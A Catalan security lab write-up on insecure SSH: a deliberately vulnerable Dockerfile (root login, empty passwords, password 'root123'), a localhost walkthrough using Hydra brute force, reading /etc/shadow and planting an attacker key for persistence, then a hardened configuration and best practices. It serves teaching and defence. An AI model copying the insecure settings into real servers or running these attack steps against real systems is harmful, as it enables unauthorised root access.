# Servei 4: SSH - Configuracio Insegura i Credencials Febles

## Descripció Breu

Una configuracio SSH insegura es una de les vulnerabilitats mes explotades en servidors Linux. Permetre el login de root per SSH, usar autenticacio per contrasenya en lloc de clau publica, i tenir contrasenyes febles, exposa el servidor a atacs de força bruta automatitzats. Cada dia, milions de servidors SSH son escanejats i atacats automaticament per bots que proven combinacions de credencials comunes.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Acces root permet llegir qualsevol fitxer del sistema
- **Integritat** -> Control total del servidor per modificar o eliminar qualsevol cosa
- **Disponibilitat** -> Possible aturada del servei o instal·lacio de ransomware

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Alt |
| **CVE relacionat** | CWE-521 (Weak Password), CWE-309 (Use of Password System for Primary Authentication) |
| **Impacte real** | Acces root complet al servidor via força bruta |
| **Estadistica real** | Un servidor SSH exposat a Internet rep milers d'intents de login per dia |

### Configuracions insegures habituals

| Parametres insegur | Risc |
|---|---|
| `PermitRootLogin yes` | Permet login directe com a root |
| `PasswordAuthentication yes` | Permets atacs de força bruta |
| `PermitEmptyPasswords yes` | Acces sense contrasenya |
| `Protocol 1` | Protocol SSHv1 amb vulnerabilitats conegudes |
| `MaxAuthTries 10+` | Permet molts intents sense bloqueig |

---

## Implementació Vulnerable

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y openssh-server

RUN cat > /etc/ssh/sshd_config << 'EOF'
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
MaxAuthTries 10
EOF

# Contrasenya root trivial
RUN echo 'root:root123' | chpasswd
```

### Verificació de la vulnerabilitat

```bash
# Escanejar configuracio SSH
nmap -p 2223 --script ssh-auth-methods localhost
# Output: Supported authentication methods: publickey, password

# Intentar login amb credencials per defecte
ssh -p 2223 root@localhost
# Password: root123
# Acces concedit com a root
```

---

## Com Explotar

### Pas 1: Descobrir el servei SSH
```bash
nmap -sV -p 2223 localhost
# Output: 2223/tcp open ssh OpenSSH 8.9
```

### Pas 2: Atac de força bruta amb Hydra
```bash
# Força bruta amb llista de contrasenyes comunes
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      ssh://localhost:2223 -t 4

# Output: [2223][ssh] host: localhost login: root password: root123
```

### Pas 3: Login com a root
```bash
ssh -p 2223 root@localhost
# Password: root123

# Control total del sistema
whoami    # root
id        # uid=0(root)
cat /etc/shadow    # llegir contrasenyes del sistema
```

### Pas 4: Instal·lar backdoor persistent
```bash
# Afegir clau SSH per acces permanent sense contrasenya
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... atacant" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# A partir d'ara, acces permanent sense contrasenya
ssh -i ~/.ssh/id_atacant -p 2223 root@localhost
```

---

## Solució

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y openssh-server

RUN cat > /etc/ssh/sshd_config << 'EOF'
Protocol 2
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
PermitEmptyPasswords no
MaxAuthTries 3
LoginGraceTime 30
X11Forwarding no
AllowUsers sshuser
EOF
```

### Verificació de la correcció
```bash
# Login root rebutjat
ssh -p 2224 root@localhost
# Output: Permission denied (publickey)

# Autenticacio per contrasenya rebutjada
ssh -p 2224 sshuser@localhost
# Output: Permission denied (publickey)
# Nomes accepta clau publica

# Força bruta aturada rapidament
hydra -l sshuser -P rockyou.txt ssh://localhost:2224 -t 4
# MaxAuthTries 3 talla la connexio rapidament
```

---

## Bones Practiques

- Desactivar PermitRootLogin completament
- Usar exclusivament autenticacio per clau publica
- Definir AllowUsers per limitar els usuaris que poden connectar
- Configurar MaxAuthTries a 3 o menys
- Usar Fail2ban per bloquejar IPs amb massa intents fallits
- Canviar el port per defecte (22) per un port alt per reduir el soroll dels bots
- Revisar periodacament /var/log/auth.log per detectar intents sospitosos

---

## Referencies

- [OpenSSH Security Best Practices](https://www.ssh.com/academy/ssh/sshd_config)
- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
- [Fail2ban](https://www.fail2ban.org/)
- [Mozilla SSH Guidelines](https://infosec.mozilla.org/guidelines/openssh)
